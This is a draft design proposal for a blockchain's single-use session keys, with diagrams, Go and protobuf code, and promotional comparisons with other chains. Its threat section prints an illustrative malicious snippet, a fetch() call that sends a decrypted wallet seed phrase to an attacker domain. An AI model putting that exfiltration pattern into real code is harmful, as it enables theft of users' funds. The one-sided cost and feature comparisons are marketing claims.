# Qora Single-Use Session Keys Protocol with Optional Split Key Support

## One Key. One Transaction. Zero Risk.

**Version:** 2.0.0  
**Authors:** Qora Network Contributors  
**Status:** Draft Proposal  
**Created:** December 2024
Features
1. Single-Use Session Keys (Always Active)
Every session key created in this module:

Can only be used for ONE transaction
Is automatically DELETED after use
Has a short expiry time (default: 60 seconds)
Is restricted by permissions (amount, recipient, contract)

2. Split Keys (Optional - With Auth App)
When users enable the Auth App:

Session keys are split between Wallet (Part 1) and Auth App (Part 2)
Both parts are required to complete a transaction
Auth App receives push notifications for approval
Transactions stay PENDING until approved
Pending transactions EXPIRE after 5 minutes

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [The Innovation](#the-innovation)
3. [Problem Statement](#problem-statement)
4. [How It Works](#how-it-works)
5. [Security Model](#security-model)
6. [Comparison with Other Blockchains](#comparison-with-other-blockchains)
7. [Technical Specification](#technical-specification)
8. [Use Cases](#use-cases)
9. [Economic Analysis](#economic-analysis)
10. [Implementation](#implementation)
11. [Roadmap](#roadmap)
12. [Conclusion](#conclusion)

---

## Executive Summary

Qora introduces **Single-Use Session Keys** — a revolutionary approach to blockchain transaction security where each transaction uses a unique, disposable key that is **automatically destroyed after one use**.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│                    THE CORE INNOVATION                                      │
│                    ══════════════════                                       │
│                                                                             │
│                                                                             │
│           ┌─────────┐         ┌─────────┐         ┌─────────┐              │
│           │  CREATE │         │   USE   │         │ DELETED │              │
│           │   KEY   │────────►│  ONCE   │────────►│ FOREVER │              │
│           └─────────┘         └─────────┘         └─────────┘              │
│                                                                             │
│                                                                             │
│                         1 KEY = 1 TRANSACTION                               │
│                                                                             │
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────────┐  │
│   │                                                                     │  │
│   │  • Key exists for milliseconds (time of transaction confirmation)  │  │
│   │  • Key cannot be reused (deleted from blockchain state)            │  │
│   │  • Key cannot be stolen after use (doesn't exist anymore)          │  │
│   │  • Master key never exposed (stays in secure hardware)             │  │
│   │                                                                     │  │
│   └─────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Why This Matters

| Metric | Traditional Wallet | Other Session Keys | Qora Single-Use Keys |
|--------|-------------------|-------------------|---------------------|
| Attack Window | **Forever** | Hours/Days | **Milliseconds** |
| Key Reusable | Yes (∞ times) | Yes (many times) | **No (1 time only)** |
| Stolen Key Risk | Total Loss | Partial Loss | **Near Zero** |
| Key After Tx | Still Exists | Still Exists | **Destroyed** |

---

## The Innovation

### What Makes Qora Different

Every other blockchain with session keys allows **multiple uses per key**:

```
OTHER BLOCKCHAINS (NEAR, Starknet, Ethereum ERC-4337):
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│   Create Session Key                                                        │
│         │                                                                   │
│         ▼                                                                   │
│   ┌─────────────────────────────────────────────────────────────────────┐  │
│   │                                                                     │  │
│   │   KEY ACTIVE FOR HOURS/DAYS                                        │  │
│   │                                                                     │  │
│   │   Transaction 1 ───► Key still exists                              │  │
│   │   Transaction 2 ───► Key still exists                              │  │
│   │   Transaction 3 ───► Key still exists                              │  │
│   │   ...                                                               │  │
│   │   Transaction 100 ─► Key still exists                              │  │
│   │                                                                     │  │
│   │   ⚠️  ATTACKER STEALS KEY AT ANY POINT                             │  │
│   │      ───► Can do remaining transactions!                           │  │
│   │                                                                     │  │
│   └─────────────────────────────────────────────────────────────────────┘  │
│         │                                                                   │
│         ▼                                                                   │
│   Key expires/revoked (hours or days later)                                │
│                                                                             │
│   ATTACK WINDOW: HOURS TO DAYS                                             │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘


QORA (Single-Use Session Keys):
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│   Transaction 1:                                                            │
│   ┌──────────────┐     ┌──────────────┐     ┌──────────────┐               │
│   │ Create Key 1 │────►│   Use Once   │────►│   DELETED    │               │
│   └──────────────┘     └──────────────┘     └──────────────┘               │
│                                                                             │
│   Transaction 2:                                                            │
│   ┌──────────────┐     ┌──────────────┐     ┌──────────────┐               │
│   │ Create Key 2 │────►│   Use Once   │────►│   DELETED    │               │
│   └──────────────┘     └──────────────┘     └──────────────┘               │
│                                                                             │
│   Transaction 3:                                                            │
│   ┌──────────────┐     ┌──────────────┐     ┌──────────────┐               │
│   │ Create Key 3 │────►│   Use Once   │────►│   DELETED    │               │
│   └──────────────┘     └──────────────┘     └──────────────┘               │
│                                                                             │
│                                                                             │
│   ✅ ATTACKER STEALS KEY AFTER USE?                                        │
│      ───► Key doesn't exist. Nothing to steal.                             │
│                                                                             │
│   ✅ ATTACKER STEALS KEY BEFORE USE?                                       │
│      ───► Can only do 1 transaction. Then key gone.                        │
│                                                                             │
│                                                                             │
│   ATTACK WINDOW: MILLISECONDS                                               │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Problem Statement

### The Trust Wallet Hack (December 2024)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│                    TRUST WALLET ATTACK ANATOMY                              │
│                                                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   Dec 8, 2024:  Attacker registers fake domain                             │
│                 api.metrics-trustwallet[.]com                               │
│                                                                             │
│   Dec 24, 2024: Malicious Chrome extension v2.68 published                 │
│                 (via stolen API key)                                        │
│                                                                             │
│                 ┌─────────────────────────────────────────────────────┐    │
│                 │                                                     │    │
│                 │   MALICIOUS CODE:                                   │    │
│                 │                                                     │    │
│                 │   // When wallet unlocks, seed phrase in memory    │    │
│                 │   // Malicious code steals it                      │    │
│                 │                                                     │    │
│                 │   fetch('api.metrics-trustwallet.com', {           │    │
│                 │     body: JSON.stringify({                         │    │
│                 │       seed: wallet.decryptedSeedPhrase  // STOLEN  │    │
│                 │     })                                             │    │
│                 │   });                                              │    │
│                 │                                                     │    │
│                 └─────────────────────────────────────────────────────┘    │
│                                                                             │
│   Dec 25, 2024: $7,000,000+ stolen                                         │
│                 Bitcoin, Ethereum, Solana wallets drained                  │
│                                                                             │
│   Result:       TOTAL LOSS - UNRECOVERABLE                                 │
│                                                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ROOT CAUSE:   Master key must be decrypted in browser memory             │
│                 → Any malicious code can steal it                          │
│                 → Once stolen, attacker has PERMANENT access               │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### The Fundamental Problem

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│   TRADITIONAL WALLET SECURITY MODEL                                         │
│                                                                             │
│                                                                             │
│                    ┌─────────────────┐                                      │
│                    │                 │                                      │
│                    │   MASTER KEY    │                                      │
│                    │                 │                                      │
│                    │  (seed phrase)  │                                      │
│                    │                 │                                      │
│                    └────────┬────────┘                                      │
│                             │                                               │
│                             │ Used for EVERY transaction                    │
│                             │                                               │
│              ┌──────────────┼──────────────┐                               │
│              │              │              │                               │
│              ▼              ▼              ▼                               │
│         ┌────────┐     ┌────────┐     ┌────────┐                          │
│         │  Tx 1  │     │  Tx 2  │     │  Tx N  │                          │
│         └────────┘     └────────┘     └────────┘                          │
│                                                                             │
│                                                                             │
│   PROBLEM: Key exposed on EVERY transaction                                │
│            1000 transactions = 1000 opportunities to steal                 │
│            Steal once = TOTAL LOSS FOREVER                                 │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘


┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│   QORA SINGLE-USE SESSION KEY MODEL                                          │
│                                                                             │
│                                                                             │
│                    ┌─────────────────┐                                      │
│                    │                 │                                      │
│                    │   MASTER KEY    │                                      │
│                    │                 │                                      │
│                    │  (in hardware)  │  ◄─── NEVER exposed to browser      │
│                    │                 │                                      │
│                    └────────┬────────┘                                      │
│                             │                                               │
│                             │ Creates single-use keys                       │
│                             │                                               │
│              ┌──────────────┼──────────────┐                               │
│              │              │              │                               │
│              ▼              ▼              ▼                               │
│         ┌────────┐     ┌────────┐     ┌────────┐                          │
│         │ Key 1  │     │ Key 2  │     │ Key N  │                          │
│         │   │    │     │   │    │     │   │    │                          │
│         │   ▼    │     │   ▼    │     │   ▼    │                          │
│         │ Tx 1   │     │ Tx 2   │     │ Tx N   │                          │
│         │   │    │     │   │    │     │   │    │                          │
│         │   ▼    │     │   ▼    │     │   ▼    │                          │
│         │DELETED │     │DELETED │     │DELETED │                          │
│         └────────┘     └────────┘     └────────┘                          │
│                                                                             │
│                                                                             │
│   SOLUTION: Each key used ONCE then destroyed                              │
│             1000 transactions = 1000 DIFFERENT keys                        │
│             Steal one = lose ONE transaction (max)                         │
│             Master key = ALWAYS SAFE                                       │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## How It Works

### Single-Use Key Lifecycle

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│                    SINGLE-USE KEY LIFECYCLE                                 │
│                                                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│                                                                             │
│   STEP 1: USER INITIATES TRANSACTION                                       │
│   ═══════════════════════════════════                                       │
│                                                                             │
│   User clicks "Send 100 QORA to Alice"                                      │
│                                                                             │
│                             │                                               │
│                             ▼                                               │
│                                                                             │
│   STEP 2: WALLET CREATES SINGLE-USE KEY                                    │
│   ══════════════════════════════════════                                    │
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────────┐  │
│   │                                                                     │  │
│   │   Wallet (with WebAuthn/fingerprint):                              │  │
│   │                                                                     │  │
│   │   1. Generate random keypair                                       │  │
│   │      session_private_key = random()                                │  │
│   │      session_public_key = derive(session_private_key)              │  │
│   │                                                                     │  │
│   │   2. Master key signs authorization (fingerprint required)         │  │
│   │      authorization = master_key.sign({                             │  │
│   │        session_public_key,                                         │  │
│   │        max_uses: 1,              // ◄── EXACTLY ONE USE            │  │
│   │        max_amount: 100 QORA,      // ◄── THIS TRANSACTION ONLY     │  │
│   │        recipient: "qora1alice...",// ◄── ONLY TO ALICE              │  │
│   │        expires: now + 60 seconds // ◄── VERY SHORT EXPIRY         │  │
│   │      })                                                            │  │
│   │                                                                     │  │
│   │   3. Register session key on-chain                                 │  │
│   │                                                                     │  │
│   └─────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
│                             │                                               │
│                             ▼                                               │
│                                                                             │
│   STEP 3: ON-CHAIN STATE                                                   │
│   ══════════════════════                                                    │
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────────┐  │
│   │                                                                     │  │
│   │   Qora Blockchain State:                                            │  │
│   │                                                                     │  │
│   │   SessionKey {                                                     │  │
│   │     granter: "qora1user...",                                       │  │
│   │     session_address: "qora1temp...",                               │  │
│   │     max_uses: 1,                   // CAN ONLY BE USED ONCE       │  │
│   │     uses_remaining: 1,             // ONE USE LEFT                │  │
│   │     max_amount: 100 QORA,                                          │  │
│   │     allowed_recipient: "qora1alice...",                            │  │
│   │     expires_at: <60 seconds from now>,                            │  │
│   │     auto_delete: true              // DELETE AFTER USE            │  │
│   │   }                                                                │  │
│   │                                                                     │  │
│   └─────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
│                             │                                               │
│                             ▼                                               │
│                                                                             │
│   STEP 4: TRANSACTION EXECUTES                                             │
│   ════════════════════════════                                              │
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────────┐  │
│   │                                                                     │  │
│   │   Validator receives transaction signed by session key:            │  │
│   │                                                                     │  │
│   │   Checks:                                                          │  │
│   │   ├── ✓ Session key exists                                        │  │
│   │   ├── ✓ uses_remaining > 0  (it's 1)                              │  │
│   │   ├── ✓ Amount ≤ max_amount (100 ≤ 100)                           │  │
│   │   ├── ✓ Recipient matches   (alice = alice)                       │  │
│   │   ├── ✓ Not expired                                               │  │
│   │   └── ✓ Execute: Send 100 QORA to Alice                            │  │
│   │                                                                     │  │
│   │   Post-execution:                                                  │  │
│   │   ├── uses_remaining = 1 - 1 = 0                                  │  │
│   │   ├── uses_remaining == 0 AND auto_delete == true                 │  │
│   │   └── ██████ DELETE SESSION KEY FROM STATE ██████                 │  │
│   │                                                                     │  │
│   └─────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
│                             │                                               │
│                             ▼                                               │
│                                                                             │
│   STEP 5: KEY NO LONGER EXISTS                                             │
│   ════════════════════════════                                              │
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────────┐  │
│   │                                                                     │  │
│   │   Qora Blockchain State:                                            │  │
│   │                                                                     │  │
│   │   SessionKey for "qora1temp..." = NOT FOUND                        │  │
│   │                                                                     │  │
│   │   The key is GONE. DELETED. DESTROYED.                            │  │
│   │                                                                     │  │
│   │   Any attempt to use it:                                          │  │
│   │   → "Error: Session key not found"                                │  │
│   │                                                                     │  │
│   │   Attacker with the key:                                          │  │
│   │   → CANNOT use it (doesn't exist on chain)                        │  │
│   │                                                                     │  │
│   └─────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
│                                                                             │
│   TIMELINE:                                                                 │
│   ─────────────────────────────────────────────────────────────────────    │
│                                                                             │
│   0ms        Create key                                                    │
│   100ms      Key registered on chain                                       │
│   200ms      Transaction executed                                          │
│   201ms      ████ KEY DELETED ████                                         │
│   ∞          Key never exists again                                        │
│                                                                             │
│   TOTAL KEY LIFETIME: ~200 MILLISECONDS                                    │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Security Model

### Attack Scenarios

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│                         ATTACK SCENARIO ANALYSIS                            │
│                                                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   SCENARIO 1: Attacker Steals Key AFTER Transaction                        │
│   ═══════════════════════════════════════════════════                       │
│                                                                             │
│   Timeline:                                                                 │
│   ──────────────────────────────────────────────────────                   │
│   0ms      Key created                                                      │
│   200ms    Transaction executed, KEY DELETED                               │
│   500ms    ██ Attacker steals key from browser memory ██                   │
│                                                                             │
│   Result:                                                                   │
│   ┌─────────────────────────────────────────────────────────────────────┐  │
│   │                                                                     │  │
│   │   Attacker has: session_private_key                                │  │
│   │                                                                     │  │
│   │   Attacker tries to use it:                                        │  │
│   │   → Blockchain says: "Session key not found"                       │  │
│   │   → Transaction REJECTED                                           │  │
│   │                                                                     │  │
│   │   WHY? The key was deleted 300ms ago!                              │  │
│   │                                                                     │  │
│   │   ATTACKER LOSS: Got useless data                                  │  │
│   │   USER LOSS: $0                                                    │  │
│   │                                                                     │  │
│   └─────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
│                                                                             │
│   SCENARIO 2: Attacker Steals Key BEFORE Transaction                       │
│   ════════════════════════════════════════════════════                      │
│                                                                             │
│   Timeline:                                                                 │
│   ──────────────────────────────────────────────────────                   │
│   0ms      Key created                                                      │
│   50ms     ██ Attacker steals key from browser memory ██                   │
│   100ms    Attacker tries to use key                                       │
│                                                                             │
│   Result:                                                                   │
│   ┌─────────────────────────────────────────────────────────────────────┐  │
│   │                                                                     │  │
│   │   Attacker has: session_private_key (still valid!)                 │  │
│   │                                                                     │  │
│   │   But key has restrictions:                                        │  │
│   │   ├── max_uses: 1        → Can only do ONE transaction            │  │
│   │   ├── max_amount: 100    → Can only send 100 QORA                  │  │
│   │   ├── recipient: Alice   → Can ONLY send to Alice                 │  │
│   │   └── expires: 60 sec    → Must act within 60 seconds             │  │
│   │                                                                     │  │
│   │   BEST CASE for attacker:                                          │  │
│   │   → Send 100 QORA to Alice (the intended recipient anyway!)        │  │
│   │   → Key deleted after                                              │  │
│   │                                                                     │  │
│   │   WORST CASE for attacker:                                         │  │
│   │   → Try to send elsewhere: REJECTED (wrong recipient)             │  │
│   │   → Try to send more: REJECTED (exceeds limit)                    │  │
│   │   → Wait too long: REJECTED (expired)                             │  │
│   │                                                                     │  │
│   │   ATTACKER GAIN: 100 QORA maximum (if they act fast)               │  │
│   │   USER LOSS: 100 QORA maximum (one transaction)                    │  │
│   │   REMAINING FUNDS: 100% SAFE                                       │  │
│   │                                                                     │  │
│   └─────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
│                                                                             │
│   SCENARIO 3: Attacker Compromises Browser Extension                       │
│   ════════════════════════════════════════════════════                      │
│                                                                             │
│   This is the Trust Wallet attack vector.                                  │
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────────┐  │
│   │                                                                     │  │
│   │   WITHOUT Single-Use Keys (Trust Wallet):                          │  │
│   │   ─────────────────────────────────────────                        │  │
│   │   Malicious code waits for user to unlock wallet                   │  │
│   │   → Master key decrypted in memory                                 │  │
│   │   → Malicious code steals master key                               │  │
│   │   → TOTAL LOSS: $50,000 (entire wallet)                            │  │
│   │   → Loss is PERMANENT (key works forever)                          │  │
│   │                                                                     │  │
│   │   ─────────────────────────────────────────────────────────────    │  │
│   │                                                                     │  │
│   │   WITH Single-Use Keys (Qora):                                      │  │
│   │   ────────────────────────────                                     │  │
│   │   Master key in hardware chip (TPM/Secure Enclave)                 │  │
│   │   → Malicious code CANNOT access hardware chip                     │  │
│   │   → Master key NEVER in browser memory                             │  │
│   │                                                                     │  │
│   │   Session keys in browser memory:                                  │  │
│   │   → Each key valid for ONE transaction only                        │  │
│   │   → Malicious code steals key                                      │  │
│   │   → Key already used? WORTHLESS                                    │  │
│   │   → Key not used? ONE transaction, limited amount                  │  │
│   │                                                                     │  │
│   │   TOTAL LOSS: 100 QORA maximum (one transaction)                    │  │
│   │   REMAINING: $49,900 SAFE                                          │  │
│   │                                                                     │  │
│   └─────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Security Comparison Chart

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│                    SECURITY COMPARISON CHART                                │
│                                                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│                                                                             │
│   ATTACK WINDOW (Time key is vulnerable)                                   │
│   ══════════════════════════════════════                                    │
│                                                                             │
│   Traditional     ████████████████████████████████████████  FOREVER        │
│   Wallet          (until user changes key - usually never)                  │
│                                                                             │
│   NEAR            ████████████████████░░░░░░░░░░░░░░░░░░░░  HOURS/DAYS     │
│   Function Keys   (until allowance depleted)                                │
│                                                                             │
│   Starknet        ██████████████████░░░░░░░░░░░░░░░░░░░░░░  HOURS          │
│   Session Keys    (until time expires)                                      │
│                                                                             │
│   Ethereum        ████████████████████░░░░░░░░░░░░░░░░░░░░  HOURS/DAYS     │
│   ERC-4337        (until revoked or expires)                                │
│                                                                             │
│   QORA             █░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  MILLISECONDS   │
│   Single-Use      (only during transaction confirmation)                    │
│                                                                             │
│                                                                             │
│   ───────────────────────────────────────────────────────────────────────  │
│                                                                             │
│                                                                             │
│   MAXIMUM LOSS IF KEY STOLEN                                               │
│   ══════════════════════════                                                │
│                                                                             │
│   Traditional     ████████████████████████████████████████  100%           │
│   Wallet          (entire wallet drained)                   TOTAL LOSS     │
│                                                                             │
│   NEAR            ████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░  ~30%           │
│   Function Keys   (gas allowance only, but still reusable) PARTIAL        │
│                                                                             │
│   Starknet        ████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  ~20%           │
│   Session Keys    (spending limit, but multiple uses)      PARTIAL        │
│                                                                             │
│   Ethereum        ████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  ~20%           │
│   ERC-4337        (depends on session config)              PARTIAL        │
│                                                                             │
│   QORA             █░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  <1%            │
│   Single-Use      (ONE transaction only, amount-limited)   MINIMAL        │
│                                                                             │
│                                                                             │
│   ───────────────────────────────────────────────────────────────────────  │
│                                                                             │
│                                                                             │
│   CAN ATTACKER REUSE STOLEN KEY?                                           │
│   ══════════════════════════════                                            │
│                                                                             │
│   Traditional     YES - unlimited times, forever                           │
│   NEAR            YES - until allowance depleted                           │
│   Starknet        YES - until session expires                              │
│   Ethereum        YES - until revoked                                      │
│   QORA             NO  - key deleted after ONE use                          │
│                                                                             │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Comparison with Other Blockchains

### Feature Matrix

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│                    BLOCKCHAIN COMPARISON MATRIX                             │
│                                                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│                          QORA     NEAR   STARK  ETH    SOLANA  COSMOS       │
│   FEATURE               (Ours)         NET   4337           (authz)        │
│   ═══════════════════════════════════════════════════════════════════════  │
│                                                                             │
│   SINGLE-USE KEYS                                                          │
│   (1 key = 1 tx)          ✅      ❌      ❌     ❌      ❌      ❌          │
│                                                                             │
│   AUTO-DELETE ON USE      ✅      ❌      ❌     ❌      ❌      ❌          │
│                                                                             │
│   PROTOCOL-LEVEL          ✅      ✅      ❌     ❌      ❌      ✅          │
│   (no smart contract)                   (AA)   (SC)                        │
│                                                                             │
│   NO EXTRA GAS FEE        ✅      ✅      ❌     ❌      ❌      ✅          │
│                                         (+50%) (+500%)                      │
│                                                                             │
│   SPENDING LIMITS         ✅      ⚠️      ✅     ✅      ❌      ❌          │
│                                 (gas)                                       │
│                                                                             │
│   RECIPIENT RESTRICT      ✅      ❌      ✅     ✅      ❌      ❌          │
│                                                                             │
│   CONTRACT RESTRICT       ✅      ✅      ✅     ✅      ❌      ❌          │
│                                                                             │
│   TIME EXPIRY             ✅      ❌      ✅     ✅      ❌      ✅          │
│                                                                             │
│   WEBAUTHN/P-256          ✅      ❌      ✅     ⚠️      ❌      ❌          │
│                                               (precompile)                  │
│                                                                             │
│   ───────────────────────────────────────────────────────────────────────  │
│                                                                             │
│   OVERALL SCORE           10      4       7      6       0       3         │
│   (out of 10)                                                              │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Why Qora Wins

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│                         WHY QORA IS THE BEST                                 │
│                                                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│                                                                             │
│   1. ONLY BLOCKCHAIN WITH TRUE SINGLE-USE KEYS                             │
│   ══════════════════════════════════════════════                            │
│                                                                             │
│   NEAR:     "Function call keys" - can be used until allowance gone       │
│   Starknet: "Session keys" - can be used until time expires               │
│   Ethereum: "Session keys via ERC-4337" - multi-use by design             │
│   Solana:   No session key support at all                                  │
│                                                                             │
│   QORA:      TRUE single-use - ONE transaction, then DELETED                │
│             ▲                                                               │
│             │                                                               │
│             └── THIS IS THE INNOVATION                                     │
│                                                                             │
│                                                                             │
│   2. PROTOCOL-LEVEL = ZERO OVERHEAD                                        │
│   ═════════════════════════════════                                         │
│                                                                             │
│   ┌────────────────────────────────────────────────────────────────────┐   │
│   │                                                                    │   │
│   │   Starknet/Ethereum (Smart Contract):                             │   │
│   │                                                                    │   │
│   │   User → Bundler → EntryPoint → Wallet Contract → Execute        │   │
│   │           (+fee)     (+gas)        (+gas)          (+gas)         │   │
│   │                                                                    │   │
│   │   Total overhead: 50-500% extra cost                              │   │
│   │                                                                    │   │
│   │   ────────────────────────────────────────────────────────────    │   │
│   │                                                                    │   │
│   │   QORA (Protocol-Level):                                           │   │
│   │                                                                    │   │
│   │   User → Validator (checks permissions FREE) → Execute           │   │
│   │                                                                    │   │
│   │   Total overhead: ~0%                                             │   │
│   │                                                                    │   │
│   └────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│                                                                             │
│   3. COMPLETE SOLUTION WITH WEBAUTHN                                       │
│   ══════════════════════════════════                                        │
│                                                                             │
│   ┌────────────────────────────────────────────────────────────────────┐   │
│   │                                                                    │   │
│   │   QORA has P-256 precompile (RIP-7212)                             │   │
│   │                                                                    │   │
│   │   This means:                                                      │   │
│   │   ├── Master key in device hardware (TPM/Secure Enclave)         │   │
│   │   ├── Master key NEVER in browser memory                         │   │
│   │   ├── Fingerprint/Face ID to authorize session keys              │   │
│   │   └── Session keys for individual transactions                   │   │
│   │                                                                    │   │
│   │   Result: COMPLETE END-TO-END SECURITY                           │   │
│   │                                                                    │   │
│   └────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Cost Comparison

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│              COST FOR 100 DAILY TRANSACTIONS (1 MONTH)                      │
│                                                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│                                                                             │
│   ETHEREUM (ERC-4337)                                                       │
│   ═══════════════════                                                       │
│                                                                             │
│   Initial wallet deployment:        $20.00                                 │
│   Session key creation:              $5.00                                 │
│   100 tx/day × 30 days × $2:     $6,000.00                                 │
│   ─────────────────────────────────────────                                │
│   MONTHLY TOTAL:                 $6,025.00                                 │
│                                                                             │
│   ████████████████████████████████████████████████████  $6,025             │
│                                                                             │
│                                                                             │
│   STARKNET                                                                  │
│   ════════                                                                  │
│                                                                             │
│   Session key creation:              $0.01                                 │
│   100 tx/day × 30 days × $0.01:    $30.00                                 │
│   ─────────────────────────────────────────                                │
│   MONTHLY TOTAL:                    $30.01                                 │
│                                                                             │
│   █  $30                                                                   │
│                                                                             │
│                                                                             │
│   QORA (Single-Use Keys)                                                     │
│   ═════════════════════                                                     │
│                                                                             │
│   3000 single-use keys × $0.001:    $3.00                                  │
│   (1 key per transaction)                                                  │
│   ─────────────────────────────────────────                                │
│   MONTHLY TOTAL:                     $3.00                                 │
│                                                                             │
│   ▏ $3                                                                     │
│                                                                             │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════  │
│                                                                             │
│   SAVINGS:                                                                  │
│   ─────────                                                                 │
│   QORA vs Ethereum:  99.95% cheaper  (2000x savings!)                       │
│   QORA vs Starknet:  90% cheaper     (10x savings)                          │
│                                                                             │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Technical Specification

### Data Structures

```protobuf
// SessionKey - A single-use disposable key
message SessionKey {
  // The account that authorized this session key
  string granter = 1;
  
  // Derived address from session public key
  string session_address = 2;
  
  // The session public key bytes
  bytes session_public_key = 3;
  
  // Maximum uses - ALWAYS 1 for single-use
  uint64 max_uses = 4;  // DEFAULT: 1
  
  // Remaining uses - starts at 1, becomes 0 after use
  uint64 uses_remaining = 5;
  
  // Maximum amount for this ONE transaction
  cosmos.base.v1beta1.Coin max_amount = 6;
  
  // Allowed recipient for this ONE transaction
  string allowed_recipient = 7;
  
  // Allowed contract (optional)
  string allowed_contract = 8;
  
  // Short expiry (e.g., 60 seconds)
  google.protobuf.Timestamp expires_at = 9;
  
  // Creation timestamp
  google.protobuf.Timestamp created_at = 10;
  
  // ALWAYS TRUE - delete after use
  bool auto_delete = 11;  // DEFAULT: true, IMMUTABLE
}
```

### Core Algorithm

```go
// CreateSingleUseKey - Creates a key for exactly ONE transaction
func (k Keeper) CreateSingleUseKey(
    ctx sdk.Context,
    granter string,
    sessionPubKey []byte,
    maxAmount sdk.Coin,
    allowedRecipient string,
    expiresInSeconds uint64,
) (string, error) {
    
    // Derive session address
    sessionAddr := sdk.AccAddress(sessionPubKey[:20])
    
    // Create single-use key
    sessionKey := SessionKey{
        Granter:          granter,
        SessionAddress:   sessionAddr.String(),
        SessionPublicKey: sessionPubKey,
        MaxUses:          1,                          // ◄── ALWAYS 1
        UsesRemaining:    1,                          // ◄── EXACTLY 1
        MaxAmount:        maxAmount,
        AllowedRecipient: allowedRecipient,
        ExpiresAt:        ctx.BlockTime().Add(time.Duration(expiresInSeconds) * time.Second),
        CreatedAt:        ctx.BlockTime(),
        AutoDelete:       true,                        // ◄── ALWAYS TRUE
    }
    
    // Store key
    k.SetSessionKey(ctx, sessionKey)
    
    return sessionAddr.String(), nil
}


// ExecuteWithSingleUseKey - Executes ONE transaction, then deletes key
func (k Keeper) ExecuteWithSingleUseKey(
    ctx sdk.Context,
    sessionAddr string,
    msg sdk.Msg,
) (*sdk.Result, error) {
    
    // 1. Get session key
    sessionKey, found := k.GetSessionKey(ctx, sessionAddr)
    if !found {
        return nil, errors.New("session key not found (already used or never existed)")
    }
    
    // 2. Check expiry
    if ctx.BlockTime().After(sessionKey.ExpiresAt) {
        k.DeleteSessionKey(ctx, sessionAddr)  // Clean up expired key
        return nil, errors.New("session key expired")
    }
    
    // 3. Verify uses remaining (should always be 1)
    if sessionKey.UsesRemaining != 1 {
        return nil, errors.New("invalid session key state")
    }
    
    // 4. Validate transaction against permissions
    if err := k.ValidateTransaction(sessionKey, msg); err != nil {
        return nil, err
    }
    
    // 5. Execute the transaction
    result, err := k.ExecuteMsg(ctx, sessionKey.Granter, msg)
    if err != nil {
        return nil, err
    }
    
    // 6. DELETE THE KEY IMMEDIATELY
    //    This is the critical step - key is gone forever
    k.DeleteSessionKey(ctx, sessionAddr)
    
    // 7. Emit event
    ctx.EventManager().EmitEvent(
        sdk.NewEvent(
            "single_use_key_consumed",
            sdk.NewAttribute("session_address", sessionAddr),
            sdk.NewAttribute("granter", sessionKey.Granter),
            sdk.NewAttribute("status", "DELETED"),
        ),
    )
    
    return result, nil
}
```

---

## Use Cases

### Gaming

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│                           GAMING USE CASE                                   │
│                                                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   SCENARIO: Player buys items in a blockchain game                         │
│                                                                             │
│                                                                             │
│   ACTION: Buy Sword (50 QORA)                                               │
│   ════════════════════════════                                              │
│                                                                             │
│   ┌──────────────┐                                                          │
│   │  Create Key  │  max_amount: 50 QORA                                     │
│   │  (single-use)│  recipient: game contract                               │
│   │              │  expires: 30 seconds                                    │
│   └──────┬───────┘                                                          │
